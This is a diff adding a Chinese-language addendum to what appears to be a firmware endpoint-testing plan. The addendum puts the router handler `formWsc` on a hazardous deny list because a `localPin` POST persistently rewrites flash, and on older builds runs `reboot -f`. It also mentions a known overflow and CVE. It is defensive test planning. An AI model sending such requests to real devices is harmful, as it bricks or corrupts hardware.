+## B-W07 增補之二（2026-08-18 桌面第三場，仍然寫在進站之前）
+
+**上面兩塊都不改。** 這一塊只加一件會改變進站行為的事，其餘全部沿用。
+
+**桌面第三場把登記簿推到 29/58**（`P8-23`），並且把三件開放題關掉兩件半：
+`formWsc` 的溢位在公開映像上成立、`localPin` 已經有 CVE、42 個 handler 為什麼
+走不到那段有廠商原始碼可以直接回答。**這些都不改進站順序**，因為它們全部是桌面
+問題，而且答案讓那一發**更不需要**在實機上跑，不是更需要。
+
+| 項目 | 進站的影響 |
+|---|---|
+| `formWsc` 進 `HAZARDOUS` | **這是唯一的行為改變。**`endpoints --allow-post` 從現在起跳過它並把跳過寫進 transcript |
+| `A3.23` 的兩發 | **不變。**五個名字不變，第一發仍然必須缺 `webpage` |
+| `A3.2` 前移 | 不變 |
+| `A3.13` 在 `A3.11` 之前 | 不變 |
+| `P9-9` 最後 | 不變 |
+
+**`formWsc` 為什麼要進禁令表，而理由不是它的名字。** 用 `qemu-mips-static -strace`
+把 guest 的系統呼叫錄下來，一發帶 `localPin` 的 POST 在**這一台跑的 build 上**
+會開 `/dev/mtdblock0`、寫 7,495 bytes、`fork` 出 `flash write-current`，再 `fork`
+出 `sysconf wlaninit wlaninterface`。在 2015 的 V2.1.2 上，同一發走的是
+`sh -c "reboot -f"`。
+
+**兩種結果對一次掃描是同一件事**：那一發之後，排在它後面的每一個端點都會回
+「連不上」，而那正是 `bench-probe.py` 說明第一段警告的假陰性形狀。差別在於第一種
+**是持久的** —— 就算今晚根本沒有跑到 `formSaveConfig`。
+
+> 🔴 **它排在 57 個名字的中段。** 舊版工具會把那一發送出去，而它不會報錯。
+
+**另外三件模擬側的修復不改進站順序，但改一句話。** `reap` 本來就沒在 reap、
+`reset` 印出來的修復指令它自己的解析器不收、`chroot` 不是隔離（guest 的
+`reboot -f` 把宿主關掉三次）。前兩件是昨天那一發沒跑成的真正原因；第三件在今晚
+沒有直接作用，**但它把「這一發最多只會弄壞模擬器」這句話刪掉了** —— 那一發在真機
+上做的事跟在模擬器上做的一樣，差別只在宿主是誰。
